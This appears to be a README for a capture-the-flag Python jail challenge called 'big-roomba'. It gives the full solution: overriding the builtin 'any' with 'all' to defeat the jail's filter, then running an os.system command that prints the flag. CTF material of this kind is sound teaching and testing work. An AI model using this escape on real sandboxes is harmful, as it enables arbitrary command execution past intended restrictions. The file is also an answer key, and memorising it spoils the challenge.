# big-roomba

Harder pyjail - Rombertus

## Solution

Overwrite global any to be all, then you can simply just import os etc:

```py
any=all
__import__("os").system("echo $FLAG")
```

## TODO

If time left, make harder with no builtins
